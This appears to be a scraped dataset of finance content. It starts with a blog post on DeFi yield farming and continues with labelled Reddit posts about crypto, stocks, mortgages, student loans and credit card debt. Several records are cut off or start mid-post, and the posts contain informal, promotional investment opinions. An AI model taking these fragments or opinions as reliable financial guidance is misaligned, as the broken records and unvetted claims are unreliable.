In my previous post about liquidity pools I provided a good example of yield farming with liquidity pool tokens (LP tokens):

*Like any other tokens, LP (liquidity providers) can stake their tokens from the liquidity pool during the period of the smart contract. A LP can therefore deposit this token on another platform that accepts the liquidity pool token to get additional yield to maximize returns. Therefore, the user can compound two or three interest rates using yield farming, and maximize returns.*

*An example of such a DeFi platform is harvest.finance. Harvest.finance allows the LP to stake their tokens and rewards them with additional rewards* ***on top*** *of their fees rewards from the liquidity pool. In harvest.finance’s case, they reward the user with FARM tokens.*

*So as an example: Let’s say you have deposited $100 in a USDC/ETH liquidity pool on Uniswap with an annual percentage yield (APY) of 50%. The received UNI LP tokens can then be staked at havest.finance for additional rewards, which in this case would be 70% FARM APY.*

*You can see that, by staking your LP tokens, rewards can be highly lucrative. By utilizing these techniques, APY’s of over 200% can be achieved. Of course, you need to remember that the price of tokens such as FARM are quite volatile and thus there is a risk to turn your $ in FARM into way less amount of $ in a matter of days.*

*If you are interested in yield farming, I would recommend to use DeFi dashboard zapper.fi, which gives a great overview of all current liquidity pools and farms.*

# Yield farming platforms in DeFi

## Harvest.finance

Harvest Finance is an automated revenue farming protocol developed for users who want to put their assets to work in high-yielding farming opportunities. Harvest will appeal most to those who cannot manage their decentralized financial positions (DeFi) 24/7 – which is most of us.

If you've ever spent time in DeFi, you already know that manually moving money between the different protocols takes time. Developing strategies and control positions takes time as well and gas fees on the Ethereum network are, at the time of writing, pretty high.

Harvest Finance tries to help by automatically searching for the latest DeFi platforms with the highest return. It then optimizes the yield with the latest farming techniques. In addition to your optimized return, you often receive extra interest in the form of harvest.finance’s own token: Farm.

Harvest works best for those looking for an easy way to harvest the yield from the latest projects in DeFi. Hence the name ""harvest"". To put money to work in these high yield farming opportunities, users only have to deposit supported tokens to get started.

## Sushi swap

As a liquidity provider you receive an extra fee on top of almost all liquidity pools on Sushiswap in addition to transaction fees: a daily payout is Sushi tokens. SUSHI is Sushiswap's own token.

When you have earned some SUSHI, you can take your SUSHI to the SushiBar. Here you can convert your SUSHI into the xSUSHI token. With this token you will earn about 5% interest per year on your amount in SUSHI:

xSUSHI automatically earns fees (0.05% of all swaps, including multichain swaps) proportional to your share in the SushiBar.

You can earn even more by depositing your xSushi on lending platforms such as Aave, to receive a small interest on top of your other interest.

## Curve.fi

Curve.fi is a decentralized exchange that mainly focuses on exchanging stablecoins (dollar, euro or gold tokens).

Curve pays the liquidity providers from transaction fees made in their pool. This is approximately between 0-10% interest per year, depending on the liquidity pool.

Like Sushiswap, Curve pays interest on top of this transaction fee in its own token: CRV. These interest payments can get pretty high (&gt; 30%!).

Curve also allows you to lock CRV coins into their vault for a set amount of time. Based on how long you lock your tokens and the amount of tokens you’re locking, you can expect even higher interest rates (up to 80%).

# Conclusion

Because of the interest-on-interest effect, you can let your savings grow faster, without depositing extra money into the account yourself. The higher the savings interest and / or the savings balance, the greater the effect. So, The longer you leave the money, the greater the yield. Thanks to DeFi (and its platforms of course), high interest rates are accessible for every crypto investor.

CryptoCurrency,US Will Not Race China to Develop CBDC Says Fed Chairman Powell,,cryptocurrency
maticnetwork,Fees Transferring MATIC from Matic to Ethereum,"Hello! I have some MATIC in the Aave liquidity market, where the APY% is currently 8.51% in MATIC. I am interested in moving my funds to Celsius because Celsius is offering a larger interest rate. Therefore, I withdrew my MATIC from the Aave market, and I was about to use the PoS bridge ([https://wallet.matic.network/bridge](https://wallet.matic.network/bridge)) to move my MATIC back to Ethereum, but then I noticed the estimated gas prices were significantly higher than they are moving from Ethereum to Matic.

The bridge estimate reads: ""Estimation of total gas required for these transactions: Withdraw Initialized=$0.00, Confirm Withdraw=$52.34, and Withdraw Complete=$91.44"" At this time, gas prices are 65-62 Gwei according to ([https://www.gasnow.org/](https://www.gasnow.org/)). I have two questions:

1. Would the TOTAL cost of gas for this transaction by $52 + $91 = $143 ? If so, then this would entirely defeat the purpose of transferring to celsius, as my bag is very small. Even a total of $91 doesn't feel worth it, as it only took $40 to transfer it from Ethereum to Matic in the first place (a couple of months ago). 
2. Is there ANY way to reduce this price so I can get my MATIC back on the Ethereum network? Do you all think it's simply not an option for me to transfer to Celsius without going through this $91 or possibly $143 gas fee? I intend to hold for a few years, so I thought the Celsius APY could be worth it, but this is very expensive...

Thank you very much.",cryptocurrency

CryptoCurrency,Stellar's Asset Clawback Function Due On June 1st - A Step Towards No More Stolen,"**EDIT: This feature is for new assets on the network that have been flagged as being able to be ClawedBack (Reversible). You, as the user, will always have the option whether to accept/use assets at any time on Stellar via trustlines. You will be told if the asset/token has this feature enabled allowing you to make a decision to accept/use certain assets/tokens.**

&amp;#x200B;

So yet again another project has had its token compromised and buggy code has meant millions of dollars of stolen funds.

If you're building a crypto project and have worries that these kind of attacks could ruin your project then look towards Stellar.

As of June 1st, as long as the testnet trial goes all well, the clawback function on the network will be activated. This means if your project is manipulated or funds are sent to wrong addresses or get into the wrong hands that you can claw them back to make sure they're in their rightful place.

EDIT: Just to reassure the community XLM, the native asset of the Stellar Network, will not be affected by this protocol update. It will only affect tokens/assets minted on the network if the issuer decides to enable it as part of their security for their asset/token.

XLM is trust-less and always will be.

Heres the summary but i encourage you to read through the proposal and see its benefits.

**""This proposal provides the Issuer with a means to clawback (and reissue if desired) assets in order to support regulatory requirements. This function can be used to:**

1. **recover assets that have been fraudulently obtained**
2. **respond to regulatory actions, if required**
3. **enable identity proofed persons to recover an enabled asset in the event of loss of key custody or theft.**

**The proposal does not involve shared custody of the person’s account and does not affect custody of bearer assets in the persons account.""**

Here are the Flags that will be added to assets wanting to make use of this feature.

## Flags

The account AUTH\_CLAWBACK\_ENABLED\_FLAG

flag allows the issuer to indicate that it has control over the use of the asset on the network. By including the flag in account flags, account owners may review the revocability of an asset issued by the issuer and have the choice to avoid this type of asset if they object to the implied trust in the issuer.

The account AUTH\_REVOCABLE\_FLAG

flag must also be set because for clawback to succeed in all cases that an account holds an asset, the issuer must be able to revoke authorization to release any offers creating selling liabilities with the asset. If an issuer enables clawback but not AUTH\_REVOCABLE\_FLAGit will likely be oversight.

By setting the TRUSTLINE\_CLAWBACK\_ENABLED\_FLAG

flag on the trustline, account owners have confidence that the clawback feature may not be enabled if it was not enabled when they created their trustline.

By setting the CLAIMABLE\_BALANCE\_CLAWBACK\_ENABLED\_FLAG

flag on the claimable balance based on the state of the trustline of the account creating the claimable balance, account owners have confidence that the clawback feature may not be enabled for claimable balances they create if it was not enabled when they created their trustline.

Heres the technicals on the Mechanism Proposal.

[https://github.com/stellar/stellar-protocol/blob/master/core/cap-0035.md](https://github.com/stellar/stellar-protocol/blob/master/core/cap-0035.md)

And the press release for the protocol 17 upgrade which will include the clawback mechanism.

investing,DD: Mother's Day is May 9th - Go Get Her Some Nice $FLWS,"**Note:** Before reading, consider if I'm worth my salt. Here's an overview of my performance since I started posting Stock Analysis to reddit: https://www.markovchained.com/profiles/view/reddit:F1rstxLas7. Any good investor heavily considers the underlying performance of a business before buying into them, so why shouldn't we do the same on reddit?

1-800-FLOWERS, or FLWS, just smashed their 3rd quarter earnings, so I wanted to write up a bit of due diligence on the company. In spirit of today's DD, here's: [a piece of digital art representing the Tulip bubble of the 1600's](https://cdn.shopify.com/s/files/1/0564/6755/4489/files/TULIPScolorSHOP.jpg?v=1619009285). 

**Intro:** If you're unaware of 1-800-FLOWERS than you probably live in a cave where no sun shines and it's cold and lifeless, but I'll give you a pass because you probably also believe it's an over-the-phone floral delivery service. Good news, it's not. 1-800-FLOWERS is a leading e-commerce provider of products and services designed to inspire more human expression, connection, and celebration which today reported results for its Fiscal 2021 third quarter ended March 28, 2021. This colorful description comes from the marketing department so to give a better idea, it operates in three segments: Consumer Floral; Gourmet Foods &amp; Gift Baskets; and BloomNet. The company offers a range of products, including fresh-cut flowers, floral and fruit arrangements and plants, gifts, dipped berries, popcorn, gourmet foods and gift baskets, cookies, chocolates, candies, wine, and gift-quality fruits, as well as balloons, candles, keepsake gifts, jewelry, and plush stuffed animals. Alright, that's enough- use Google if you want to know more of the basics.


**Note:** This is a *cyclical* business. If it wasn't clear to you already, I'm going to state now that their quarterly results vary based on the celebrated holidays within their time frame. For example, in the year 2020, the quarters that ended in March &amp; September had roughly the same amount of Net Revenue but the quarter that ended in June had 1.5 times that amount. The Holiday season quarter ending in December *more than doubled* that very same quarter ending in June.

**Metrics:**

1.  ROIC, as of today for the TTM, is 19.66%. Over the last 5 years, starting at 8.11%, FLWS ROIC has steadily increased and is now more than twice it was only 5 years ago. (GuruFocus.com) ROA &amp; ROE are both also currently greater than 10%, but I'm not usually as focused on those metrics. (Finviz.com)
2. Institutional Ownership is 88%. In previous posts of mine, I've mentioned that I like seeing high enough IO to inspire confidence from the big guys, but a margin large enough to allow more big guys to come in and drive the price up with bulk buying. 88% is a great spot for Institutional Ownership. (Finviz.com)
3. D/E, as of prior to this most recent earnings report, is .34. I hate seeing debt, whether it be short or long term but the upside here is that FLWS has proven how to *make lending work for them.* At any rate, they are far from their own worst enemy, but here's the hot button topic that everyone is talking about: FLWS has a 27% Short ratio. As far as I'm concerned, this is *way* too high for such a strong business, but it's more important to note that this ratio is very likely based on cyclical, quarterly moves in the stock price. In my opinion, this is a risky, but fair short term trading strategy for a cyclical business like this. I believe, based on these fundamentals, that there's way too much risk betting against FLWS, even quarterly, but Hedgies gonna Hedge. (Finviz.com)
4. PEG Ratio was at .8 at market close yesterday for the next 5 years. For the *last* 5 years, EPS grew 24% *without* emphasis on their ecommerce business. This is with a P/E ratio of only 15, I mind you. With today's quarterly report, this is only going to get stronger. If you need me to spell this out, I will- their margins are only going to get stronger from here on out AND they're still undervalued. (Finviz.com)
5. Operating Cash Flow doubled from 2019 to 2020 and then *more than doubled* from 2020 to the TTM. (Yahoo Finance)
6. As of this morning, FLWS raised their share buyback program to $40 million. This management team knows what they're doing. They're taking full advantage of the shorting a cyclical business by purchasing their own shares when *they know* the price will be undervalued. All of this value comes right back to the shareholders for free. 

**Bear Case:** No company is perfect, so it's important for me to poke holes in any potential investment I'm considering. The bear case for 1-800-FLOWERS is consumer-centric. My research talking to people about the service and products have largely revolved around the same issue: Flower quality. Despite FLWS offering many different products and services, it appears that most people I have spoken to have felt somewhat disappointed by the flowers that have been delivered. In my own personal opinion when I have used the site for flower delivery, I did not experience the same- but again, that's just my own opinion. There were plenty of positive comments made about other offerings, but consumer sentiment is a piece of the puzzle when considering supporting a company, so I've taken this into account and will continue to monitor any changes.

**Subjective Analysis:** I think FLWS has what it takes to really bloom (sorry, I had to). A track record of a strong financial foundation, growth on the horizon by way of their Bloomnet and focus on their Ecommerce presence, and the ability to do all this with great margins and leadership team that *wants* shareholders to succeed.

personalfinance,Temporary demotion worth it?,"So I currently work at amazon. I’m a process assistant (step under a manager) in a fulfillment center. When I moved to this building 7 months ago Amazon gave me a 10K bonus. I have been accepted into an apprenticeship program for robotic maintenance with amazon. If I accept the apprenticeship I would take a temporary demotion, and per my contact I would have to pay a prorated amount from the 10K bonus back. Approximately 4K would need to be repaid. I currently make $17/hr and the apprenticeship would send me to school for 12 weeks at Amazon’s expense, then I would move across the country from Ohio to New Mexico to do 1 year of on the job learning. While I’m doing on the job learning I would make $21.30/hr which is about 10K more than what I’m making now. Once I complete the year I would be able to test into a different technician level making up to $35/hr, but realistically I would probably make around $25/hr and test into a lower level. I have a small savings which would cover the repayment, but I would not have much money left over to actually move across the country and break my lease. I could throw it all on my credit cards and pay my credit cards off over the course of a year which most people probably don’t like to hear. Could I also go to my credit union and get a personal loan to pay for the repayment and the move? Better interest rates than my credit cards. Or open a new card with an initial 0%apr for 12-18 months? Is this new job even worth it? There’s honestly no guarantee that I would be able to move back closer to friends, but if I stay in my current role I can continue to go to new buildings and get that 10K bonus, I could also continue to work my way up in operations and become a manager. Any and all advice would be appreciated. I have a day or 2 at most to accept or decline the offer because amazon wants me in school on may 9th",finance

personalfinance,Adjustable rate mortgage vs 30 yr fixed,"We an closing on a house we bought for $400,000 with 5% down and no PMI because it’s a physicians loan. I am starting a 3 year medical residency after which we will likely move but could be in the house for 6 years if I stay for a fellowship. The interest rate on a 7/6 ARM is 2.365% and a 30 year fixed is 3.000%. I like the ARM because more of our payment goes towards equity in the house and because we will probably sell but I’m worried that if we are there for 6 years we would only have one year left to sell before we have to refinance and I’m sure the interest rates are going to go up (increase capped at 5%). This house is in a good location to rent near the hospital, so we could keep it and rent it out to pay the mortgage after we leave. How should I decide between?",finance
personalfinance,Pay Down Mortgage or Invest?,"My wife and I bought our first home about four months ago. We've been paying about 20% over the minimum payment for these first four months. Our interest rate is low, 2.625%.

We have fully funded 3-month emergency fund. We max out our IRAs, and we save heavily into our employer-sponsored retirement accounts, maximizing our employers' match.

We are planning to start a family and get a dog soon, so we have savings goals in our budget for those expenses based on some research and talking with friends in the area about their expenses for having a dog and kids.

We have no other debt -- no student loans and we pay off our credit cards in full each month.

After all this, we still have a little money left over each month.

Our question is this: should we be investing the few hundred dollars extra per month in some low cost mutual funds, or should be be pitching it into our mortgage? Our idea is that we could save that money in a mutual fund and keep saving until it hits the same value as the remainder on our mortgage and then just pay off the mortgage.

I suspect this is a ""do what you want"" question -- there may not be a ""right"" answer so much as a ""right for you"" answer, but I would love some perspective on this. Thanks in advance!",finance
personalfinance,Refinance two mortgages? Stay the course? What is the bank not telling us?,"We have two mortgages, primary and vacation home, both on 7 yr ARM:  3.1% and 3.79%.  We had refinanced both in fall of 2019 to reduce interest rates when they started to improve.
Bank is telling us now we could refinance both to new 7 yr ARM at 2.469% on primary and 2.594%.  Bank also suggested combining both into one on the primary home, paying out vacation home in full and have 2.434% on the combined new loan amount on our primary home.  They say we would break even in 5 months.  But that’s all they are saying.

I’m not familiar with the pitfalls of taking out equity on the primary to pay off the vacation home in full.  We plan to downsize and sell the primary sometime in the next 2-3 years, there is decent equity in both, but especially the primary.

Does refinancing make sense at all?  Should we simply avoid resetting interest and stay the course as is?

personalfinance,Paying off Student Loans,"Hey everyone, I was hoping to see what everyone thought about my situation here or if anyone has been in a similar situation. We are meeting with a financial advisor next week but wanted some peer input as well. We have some student debt and are thinking about trying to buying a house (350k) by the end of the year or early next year if possible.

Summary:

I am currently employed with a very secure job and she just graduated with a degree in the medical field. We both make or will be making 60-70k each and in our late 20's. We both have 750+ credit scores. We are about to move in with the parents for a few months to try to save/pay off loans.

Debt:

My wife and I have about 80k in student debt. The interest rate for this is around 5-6%

Savings/Retirement:

I have 15k in checking, 40k in savings, and 20k in a brokerage that can be liquidated pretty easy (Sitting most in cash). She has 65k in a brokerage that would be a little more difficult to liquidate but possible(small amount of taxes on long term gains). I also have a decent amount of money in 401k, IRA, Roth, ect (But I will never touch this). My wife has no retirement started yet.  

My question is should I pay off all of our student loans right away and then try to save for a house while living with my parents? Or maybe we should only pay half and refinance? I was thinking about paying most of the debt off with checking, savings, and brokerage accounts and keep 10k as our safety net. My wife doesn't have any retirement savings started yet so I really don't know if we should use the brokerage account she has for anything.

Any thoughts or has anyone been in a similar situation?",finance
personalfinance,Is it a good idea to pull my crypto assets to pay back student loan debt? Or buy a house?,"First a bit if background: I went to a state university right out of high-school and racked up a considerable amount of debt before graduating dec 2015. I've been paying it off incrementally as I rose in my career and currently still have ~65k left to pay. Now I'm in my late 20's with a good job; 6 figure base salary plus commission in addition to some on the side work netting me 20-25k a year. I still rent as I initially wanted to pay this debt before buying a home and currently have ~16k in savings. The only thing besides my loan I owe money on is my car, no credit card or other sort of debt.

In 2017 I started ""investing""(gambling) in the crypto markets; Note this is separate from my stock options, 401k, etc; all the money I'm talking about is my ""play with"" crypto money. Back in August of 2020 I shuffled everything around due to a small bubble and reinvested 10k, which has been untouched and is now worth 70k because of the current bubble. This is the crux of my current dilemma. I want to pay off my student loans and by crypto assets are more then capable to knock it all put now. But since its been less then a year since I reinvested I will be subject to capitol gains on the profit of 60k. Because of my income if I take it out i will definitely put myself in either the 32% or 34% bracket, meaning thats the rate my crypto profits will be taxed at. 

I'm obviously not holding out hope for loam forgiveness from the Biden administration because of my tax bracket and am currently torn on if I do actually want to pay my loans off before buying a home. I can keep well ahead of min payments as is and would have it payed off by 2026, so why rush it with the low interest rates?

So my options are as follows:

1. Wait until late August and pray this bubble does not burst 

2. Take the money and pay off debt but brace myself for a 20k+ tax bill in 2022. Then use the money for either my loans or a house down payment. 

3. Take the money and set aside what I need for taxes and pay off only some of my loan

4. HODL to the moon?

personalfinance,Buying a new car — is it worth it?,"Hi all. I’m hoping I can get some insight on buying a new car with our finances. My wife and I currently have a 1 year old, a 16 year old, and currently pregnant with a baby due in the fall. We both have 2013 cars that will not hold all 3 kids in the backseat (2 car seats). We want to buy a brand new mini van as we will keep it for at least 10 years (most likely more) and it will allow us to have room if we add another kid to our family (which we most likely will as we are foster parents). All the info I’m finding on the internet says not to buy a new car — however when looking at used mini vans (between 2017-2020) the difference in price is between $5-13k for a new minivan and these all have at least 30k+ miles on them. We are looking at the Toyota Sienna and Honda Odyssey. We get regular maintenance on our cars now and the only debt we have is our mortgage payment. Neither of us are car people and we use the dealership shops for regular maintenance on both cars. 

So, is buying a new car worth it? Or should we look at used? We can put between $7500 and $11k down plus a trade in. That still leaves us roughly $10k or more in our emergency/savings account. Currently we are able to put in savings ~$1500/month and both of us contribute to our 401ks.

Online calculators say our payments could be roughly $485-$550 dollars depending on interest rate and total price of van. We both have excellent credit.

personalfinance,Need some advice regarding my current financial situation.,"I currently own a house and have about 20k saved up. I have a full-time job. I am planning to sell my house, and hoping for about 50k profit after all the fees, repairs, etc.

My main goal after this point is to grow my money. I am split between buying another house at a lower interest rate or investing my profits and growing the money further. I would love to invest in a business, but I can't put a lot of work into it as I will still have my full-time job. 

What are some good ways to grow my money without spending too much time? I feel like if I buy another house, my money will be tied up and I can't do much with it. I'm a bit wary of putting the money into stocks as I have lost 2k recently.

2. Passively invest in a business and rent an apartment?
3. Talk to a professional financial advisor?

personalfinance,Did we screw up by over investing in retirement and buying a cheaper house/ 15 year mortgage than what we can afford?,"My wife and I (30) (we make 180K combined) have been following /PF advice for years now and followed the principle of investing/ savings, etc. As it stands we have 55K$ cash, 400K in retirement and 30K$ investment (index funds). We brought a home in 2019 for 380K  with 282K mortgage at 15 years @ 3% worth market probably worth 430K$.  No car debt (but may need a car soon), loans or any other debt. 

My issues are as follows:

I'm thinking long term and realize we may need to upgrade to a large home / better school district in the future now that we have a kid. Those houses are around 550-700K$ and I fear if we wait it'll go up to 1M$+. We feel we screwed ourselves over by not buying a bigger house in the first place and taking out a bigger mortgage at lower interest. Now with the pandemic everything's inflated with higher interest rates. I feel if I sold this house and brought another I may be able to choose 30 years instead of 15 mortgage.

Then comes the issue did we put too much in retirement?  Should've I saved more cash so I could've had a bigger down payment for a bigger house in the beginning?

personalfinance,Why the next-higher tax bracket is such a bogeyman,"Only the amount you make above a certain cut-off income is taxed at the next-higher tax bracket (quite a few people think that their ENTIRE income will be taxed at the higher tax bracket once their earnings reach that level). But I was wondering whether the fear of “landing in the next-higher tax bracket” isn’t actually somewhat exaggerated. So I ran a very simplified example, rounding off all numbers, using a situation with some flexibility:

Let’s say I, the retired half of a couple, want to transfer some of my IRA funds into my Roth, and I want us to stay in the 22% bracket, which cuts off at 171k. Thus, we as a couple can earn income up to 195k (195-24 standard deduction=171k). 100k of that sum are my spouse's wage earnings, leaving me with 95k available for Roth conversion. Our marginal tax rate at 22% would generate a tax liability of 49k.

If I moved 125k into the Roth instead (total earned income now: 225k), I’d pay marginal taxes in the 24% bracket on only 30k, but my total tax liability would be 59k. So the extra 30k converted would result in 10k more in taxes. Clearly not a desirable situation.

Is this a simple, but accurate representation? Or am I missing something crucial here?

PS: I used the Smart Asset tax calculator: [https://smartasset.com/taxes/income-taxes](https://smartasset.com/taxes/income-taxes). It looks like it assumes the standard deduction unless told otherwise.

Edit: I'm looking at **federal and state taxes**. But the calculator doesn't account for the mixture of earned wage income and retirement income. Using a more fine-tuned calculator, I get this

* Scenario 1: 46k in taxes (100k in wages, 95k in ""retirement income"")
* Scenario 2: 54k in taxes (100k in wages, 125k in ""retirement income"")",finance

personalfinance,Lots of credit card debt and my transmission just blew out. Not sure how to balance my finances to make this work as I have a low income and savings. Very stressed.,"So I have quite a bit of credit card debt due to being less than responsible with them. I knew the risks when using them so I definitely take ownership of it. My plan was to being to really hammer the debt to get it down to a more reasonable level. However, my car that I had (bought outright from a family friend) blew its transmission the other day. So now I have no car, not enough monthly income to make a payment, too much debt to realistically assume more, and not enough saved to actually buy a used car outright.

I'm going to lay out all of my financials so you guys can have a better idea, then I'm going to say the ideas I'm thinking to handle this:

Checking Account: **$1,750** Savings Account: **$7,050**

Credit Card #1: **$2,726.06** out of **$10,300** Total Limit

Credit Card #2: **$2,300.00** out of **$9,000** Total Limit

Credit Card #3: **$4,180.00** out of **$5,000** Total Limit

Total Credit Card Debt: **$9,206**

Credit Score as of right now is above 700 but less than 750. 

**Monthly Income:** 

\- (Job) Bi-weekly pay: **$909**

**TOTAL =**

**$1820**

**Monthly Expenses:** 

\- Therapy: **$180**

\- Credit Card #1: **$50**

\- Credit Card #2: **$80**

\- Credit Card #3: **$100**

\- Rent/Home help (live with mom): **$250**

\- Groceries: **$200**

\- Gas\*\*\*: **$80**

\- Savings: **$250**

**TOTAL =** 

**$1190**

I'm not counting insurance or a car payment yet, so after all is said and done, I have **$630** left over at the end of the month. I have been quoted insurance generally and it seems that it would be anywhere between $225 on the low end as much as $350 on the high end as I've been a driver on my moms insurance and this would be my first policy in my name. Car payments obviously are hard to predict, but lets say I get a lease for $180 a month as that is a realistic and simple number. This would mean that my monthly car expenses could be anywhere around $450. This leaves me with $230 left over at each month for spending money, savings, or credit cards. 

&amp;#x200B;

**Buying a cheap used car:** I have spent several days looking on every car website and I can't find anything good. All of the cars are over $6,000 alone, not inclusive of Taxes &amp; Fees. I haven't been able to find any cheaper cars that don't have fine print requiring a down payment of $2,000-$3,000. This would direct me to financing the car, however the payments on say a $7,500 loan at 3.5% interest (if I got that) would be around $136.44 a month, which is decent. The problem with this is a lot of financial institutions (mine included) only offer used car loans up to 11 years old. The cars that are under $10,000 are almost unanimously either older or with extreme mileage on them. On top of this I have had a few people recommend against getting a used car as it could just be buying someone else's problem causing me to spend more money on it. This makes buying a used car a problem

&amp;#x200B;

**Leasing a new car:** This has also been considered by me and as stated above, I'd likely get a lease payment of around $180, and insurance being a median of $250-$275 makes my monthly around $450. This would be realistic but then you factor in my credit card debt, which would be bought to a standstill or just slowly increase as I would be unable to pay anything toward them except the interest. Lots of the lease deals on car websites that have cheap leases (Chevy and Hyundai) are good but require a large down payment (in the range of $2000-$4000). This makes leasing a problem.

&amp;#x200B;

**Taking the bus and hammering my credit card debt:** This isn't ideal of course, it's 2 busses and about a 45 min -1 hr trip home and back. On the plus side, the tickets I'd need to buy would add up to around $110 a month, which is less than I'm paying now on insurance. My plan is I take the bus to and from my job, and live the way I'd be living if I had those car + insurance payments, but just put the $450 each month on a credit card (all 3 of which I have stopped using entirely). I'd be living and getting comfortable and used to living on that much smaller amount of money, but I'd be getting my debt down, and worst case scenario if it's not manageable I can simply lower the amount I'd pay toward my credit cards, while also not being responsible for insurance and a car payment. This seems like the best idea in my head. Going from taking busses to driving was huge, and going back to taking the bus would be a little inconvenient compared to a car but it's definitely something that I can do though. On top of this the idea makes me feel better as money that would be going to a car payment and insurance would now be going to my debt. I was already planning on putting my tax return (hopefully about $600-$1000) toward my cards and taking $1,000 out of my savings to put toward them, and $1,000 out of my checking when it gets to $2,500 to put toward them also. This with 1 month of those payments would bring my debt down to $6750. Credit Card #3 is a low rate card (2.99%) I got with the intention of transferring my card balances. I have done this a little already. Ideally I would want all of my debt to be on that card (so under $5,000) which would give me 1 credit card payment a month consolidated in 1 place on a low interest rate. Once I had it at around $4500-$5000 I'd be much more able to get a car as I'd free up almost $150 from my expenses. 

&amp;#x200B;

I could get a raise at my job it's just a matter of when positions pop up. They pop up every few weeks/once a month. I work really hard and my supervisors have told me that I'm ready to make that next step, I'd just have to out-interview the other candidates (I interview well), and hope they don't put too much weight on experience in the job (some people in that position apply to the new listings to change their location). This would be about $12,000 a year or a little over $5 an hour raise. Hopefully I can get this in the next few months. I've already stopped needlessly spending money on ubereats/eating out, cancelled every subscription I had (kept Spotify, Gym, Headspace), stopped buying clothes, stopped buying books (Big book reader and buyer).

Banking,Capital One Holding Money Hostage - What can I do?,"I had an extremely unpleasant experience with Capital One on Thursday and now I cannot utilize my bank account until further notice. 

I used my debit card (with a good amount in it )  to make a purchase but Capital One had placed a hold on the account until I had confirmed that it was me- I confirmed via email and over the phone that it was me making the purchase (and even gave my social security number to confirm). 

Capital One told me that my account was basically unusable until I got a new card and that if I wanted access to MY MONEY within the account - that I would have to get a new card through cashapp (not them) because they could not help me (or refused to). 

They then proceeded to tell me that my card would arrive within a few days - this was a lie. I had been waiting all week for a new card only for it to never show up - I called Capital One today to inquire about the new card and they fed me another lie by saying it had been lost in the mail. They said they would send me a new card but did not know when it would arrive. 

I have living expenses and bills to pay and Capital One's dishonest business practices are holding my money hostage. 

This all occurred because I CONFIRMED that it was me when they had placed a hold on the account. 

I need some help with this - I have reached out to the Capital One executive team and they have been ignoring my emails for an entire week. 

I would like to have access to my own money but Capital One's dishonest business practices are preventing me from paying my bills even though I have the money. 

Capital One has given me contradicting and false information at every turn and their customer service has been non existent so I am at a loss for what to do. 

I opened up a PNC Bank account today so that I can have a working debit card to use for my bills but now Capital One is not letting me transfer money into that account until they put a ""verification deposit"" into the new account - this will take a few days too. They are holding my money hostage in whatever way that they can. 

I have been unable to use my own bank account for like a week and there is no end in sight so I am panicked and just at a loss. I am supposed to be moving in two weeks and I have expenses associated with that so this is just not ideal. 

I just do not know what to do - I cannot really trust that the new Capital One debit will get here on time (or at all) because they have proven that they cannot be trusted.",finance

* Card 2 has a balance of 1.2k and is still under the promotion of no interest for the first year, this ends in November. The minimum required payment is $35

I've been making payments of $100 to each card but that isn't helping much, especially on Card 1.

Some background on my current standing:

* I'm 24 years old just out of graduate school
* Credit score around 667
* I currently work part-time in NY with about 8-15 hours a week at $30/hr
* Starting August I will start working full-time in NY at a base salary of $65k with bonuses 
* I have been splitting rent at $712 a month and about $160 a month on utilities but coming next week I will be moving back with my parents until before the new job starts (I will help with utilities there, not sure how much)
* My next place will be around $2.2k split with my girlfriend (I will handle utilities and she will handle groceries)
* I will have student loans to tackle come July (with covid relief, no interest until September 30 or so)

I want my CC debt gone ASAP and have been thinking of how to best do it. I've stopped using my CCs for the past 5 or so months and just have been paying them off, and honestly, I've been turned off from using credit since seeing how poorly I've managed it so far. Debt consolidation or refinancing are top of my mind, especially with my high interest rate on Card 1. I've tried applying for NY partial unemployment with no luck so far. I also know of the snowball and avalanche method but don't think they will help ease the burden as quickly.

I would love some direction on how to tackle this. Thanks!",finance

My first thought was to put my money in my ROTH IRA which I opened up in January of this year. I would be able to fully max out my contribution for 2020 and start making progress on 2021 contributions. The second option I have come up with is paying off one part of my student loans which have a 7.6% interest rate. My thought process behind this is while this would not get rid of all my student loans, this would get rid of the private loans that I took out, which are in my parents name, so at the very least this would bring me some peace of mind.",finance

stocks,"Here is a Market Recap for today Thursday, April 29, 2021","**PsychoMarket Recap - Thursday, April 29, 2021**

Stocks hit fresh record highs as market participants considered a batch of stronger-than-expected corporate earnings reports and new proposals from President Biden aimed at revamping the US’ infrastructure and supporting families, children, and students. The S&amp;P 500 (SPY) hit a new intraday record, driven by gains in mega-cap stocks like Facebook (FB) and Apple (AAPL), both of which reported blowout earnings. 

Last night, President Biden addressed a joint session of Congress, during which he said “America was back on the move again” following the coronavirus pandemic that devastated the economy. In his address, President Biden touted his $2 trillion infrastructure plan and unveiled a new $1.8 trillion proposal aimed at supporting children, students, and families. This proposal, called the American Families Plan, would be funded in part with the newly proposed tax increases on the wealthy. [Read the details of the proposal here](https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/28/fact-sheet-the-american-families-plan/).

Earnings season continues to deliver blowout results, with Apple and Facebook massively outperforming analyst expectations. Facebook’s stock, in particular, gapped up more than 7%. The strong results from these companies adds to a parade of mega-cap companies that have vastly outperformed estimates, driven by a surge in demand as the US economy gradually reopens thanks to effective vaccine distribution. According to FactSet, as of early Wednesday, companies comprising nearly half of the S&amp;P 500's market capitalization had reported earnings results, with 83% of these corporations topping estimates, and by an average of 21.7%. 

Market participants also digested recent commentary from members of the Federal Open Market Committee (FOMC), which included no major changes to policy but did highlight recent improvements in the US economy. FOMC members said the effective distribution of the vaccine in the US has improved economic conditions but reiterated interest rates will remain near-zero and the current pace of the asset purchasing program in place. The Fed said, “Amid progress and strong policy support, indicators of economic activity and employment have risen.” The committee remains optimistic about the rebound in economic activity, describing the most affected sectors as “having shown improvement”, but shows no signs of slowing quantitative easing or raising interest rates. With more than 8 million people still out of jobs compared to pre-pandemic levels, FOMC reiterated its commitment to supporting the economy.

**Highlights** 

* The Labor Department released its Weekly Unemployment Report, which shows fresh pandemic-era lows as the economy gradually reopens.
   * **Initial jobless claims, week ended April 24:** 553,000 vs. 540,000 expected and an upwardly revised 566,000 during the prior week
   * **Continuing claims, week ended April 17:** 3.660 million vs. 3.590 million expected and a downwardly revised 3.651 million during the prior week
* Shares of Uber, Lyft and Doordash (DASH) fell sharply after Reuters reported that Labor Secretary Marty Walsh supported reclassifying gig workers as employees. This change would give workers additional benefits at a large cost to companies. Recall the battle last year over Proposition 22 in California, which eventually passed in favor of companies in the gig-economy. 
* US gross domestic product (GDP) increased at a 6.4% quarter-over-quarter, seasonally adjusted annualized rate in the first three months of 2021, [the Bureau of Economic Analysis said Thursday in its first estimate on GDP. ](https://finance.yahoo.com/news/us-economy-accelerated-robust-6-123644612.html)This marked an acceleration from the 4.3% annualized growth rate from the fourth quarter of 2020

